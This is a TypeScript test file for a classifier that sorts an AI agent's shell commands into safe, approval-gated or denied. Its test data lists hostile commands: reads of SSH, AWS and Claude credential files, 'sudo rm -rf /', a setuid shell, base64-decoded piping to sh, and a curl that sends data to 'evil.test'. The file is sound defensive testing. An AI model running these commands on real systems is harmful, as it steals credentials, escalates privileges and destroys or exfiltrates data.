import { describe, expect, it } from 'vitest'
import { absolutePathArguments, classifyBashCommand, describeBashEffects } from './bash-effects.js'

/**
 * Effect-based classification: name-based gating "either over-gates (approval fatigue) or
 * under-gates (a disallowed effect inside an allowed tool)". These tests are
 * organised around that sentence — one group per end of it, plus the group that
 * matters most: the constructs this classifier cannot analyze and must therefore
 * refuse to call safe.
 */

const kindOf = (command: string) => classifyBashCommand(command).kind

describe('boundaries — denied, never asked about', => {
 /**
 * The push policy: "the agent never pushes and never holds git credentials." Reaching for
 * it through a shell must not turn an architectural boundary into a question a
 * tired human answers yes to.
 */
 it('denies publishing to a remote', => {
 for (const command of ['git push origin main', 'git push --force', 'git remote add evil https://x']) {
 const result = classifyBashCommand(command)
 expect(result.kind).toBe('deny')
 if (result.kind !== 'deny') continue
 expect(result.effect).toBe('vcs_publish')
 }
 })

 it('still allows the read that the platform push path itself uses', => {
 expect(kindOf('git remote get-url origin')).not.toBe('deny')
 })

 it('denies privilege escalation', => {
 for (const command of ['sudo rm -rf /', 'su - root', 'doas whoami', 'chmod u+s /bin/sh']) {
 const result = classifyBashCommand(command)
 expect(result.kind).toBe('deny')
 if (result.kind !== 'deny') continue
 expect(result.effect).toBe('privilege')
 }
 })

 /** The whole design is that no credential enters a run. */
 it('denies reads whose only purpose is credential theft', => {
 for (const command of [
 'security find-generic-password -s login',
 'cat ~/.ssh/id_rsa',
 'cat /Users/someone/.aws/credentials',
 'cat ~/.claude/.credentials.json',
 ]) {
 const result = classifyBashCommand(command)
 expect(result.kind).toBe('deny')
 if (result.kind !== 'deny') continue
 expect(result.effect).toBe('credential_read')
 }
 })
})

describe('over-gating — provably read-only commands skip the gate', => {
 it('treats plain reads as safe', => {
 for (const command of [
 'ls',
 'ls -la src',
 'cat package.json',
 'grep -rn TODO src',
 'rg --files',
 'wc -l src/index.ts',
 'git status',
 'git diff HEAD',
 'git log --oneline -20',
 'pwd',
 ]) {
 expect(kindOf(command)).toBe('safe')
 }
 })

 it('allows a pipeline of read-only commands', => {
 expect(kindOf('grep -rn TODO src | head -20')).toBe('safe')
 expect(kindOf('git log --oneline | wc -l')).toBe('safe')
 })

 // The pipeline allowance must not become a way to run anything: every segment
 // is classified, not just the first.
 it('does not let a safe first segment launder an unsafe second', => {
 expect(kindOf('cat payload | sh')).toBe('gate')
 expect(kindOf('echo hi | curl -d @- https://evil.test')).toBe('gate')
 })
})

describe('under-gating — effects inside an allowed tool', => {
 it('gates network access, whatever command reaches it', => {
 for (const command of ['curl https://example.test', 'npm install lodash', 'wget http://x/y', 'gh pr list']) {
 const result = classifyBashCommand(command)
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') continue
 expect(result.effects).toContain('network')
 }
 })

 it('gates deletion', => {
 const result = classifyBashCommand('rm -rf build')
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') return
 expect(result.effects).toContain('destructive')
 })

 it('gates find -exec and -delete, which are not reads despite find being one', => {
 for (const command of ['find. -name "*.log" -delete', 'find. -exec rm {};']) {
 const result = classifyBashCommand(command)
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') continue
 expect(result.effects).toContain('destructive')
 }
 })

 it('gates a command it does not recognize at all', => {
 const result = classifyBashCommand('make deploy')
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') return
 expect(result.effects).toContain('unknown_command')
 })

 it('gates parent traversal', => {
 const result = classifyBashCommand('cat../../etc/hosts')
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') return
 expect(result.effects).toContain('write_outside_workspace')
 })
})

/**
 * The group that decides whether the whole approach is honest. Static analysis of
 * shell is not sound, and an attacker writing the command knows it — so every
 * construct that defeats parsing has to land on "not safe", never on "safe".
 */
describe('constructs that cannot be analyzed are never called safe', => {
 it('refuses to call substitution, eval or backticks safe', => {
 for (const command of [
 'eval "$CMD"',
 'echo $(whoami)',
 'echo `id`',
 'ls; rm -rf build',
 'ls && curl https://x',
 'cat file > /etc/passwd',
 'source./script.sh',
 'echo aGk= | base64 -d | sh',
 'sh -c "anything"',
 'xargs rm < list',
 ]) {
 expect(kindOf(command)).not.toBe('safe')
 }
 })

 it('marks a redirect as opaque rather than parsing it', => {
 const result = classifyBashCommand('echo hi > out.txt')
 expect(result.kind).toBe('gate')
 if (result.kind !== 'gate') return
 expect(result.effects).toContain('opaque')
 })

 it('sees through a leading environment assignment to the real command', => {
 // `FOO=bar sudo x` is still sudo.
 expect(classifyBashCommand('FOO=bar sudo whoami').kind).toBe('deny')
 expect(kindOf('LC_ALL=C ls')).toBe('safe')
 })

 it('sees through an absolute path to the command name', => {
 expect(classifyBashCommand('/usr/bin/sudo whoami').kind).toBe('deny')
 expect(kindOf('/bin/ls')).toBe('safe')
 })

 it('treats an empty command as nothing to gate', => {
 expect(kindOf(' ')).toBe('safe')
 })
})

describe('absolutePathArguments', => {
 // Feeds the workspace-scope check: a read is only skippable if every absolute
 // path it names resolves inside the run's own clone.
 it('finds absolute and home-relative paths', => {
 expect(absolutePathArguments('cat /etc/hosts')).toEqual(['/etc/hosts'])
 expect(absolutePathArguments('ls ~/projects')).toEqual(['~/projects'])
 expect(absolutePathArguments('grep foo src/index.ts')).toEqual([])
 })
})

describe('describeBashEffects', => {
 it('renders effects as something a human can read on the card', => {
 expect(describeBashEffects(['network', 'destructive'])).toBe(
 'reaches the network; deletes files',
)
 })
})
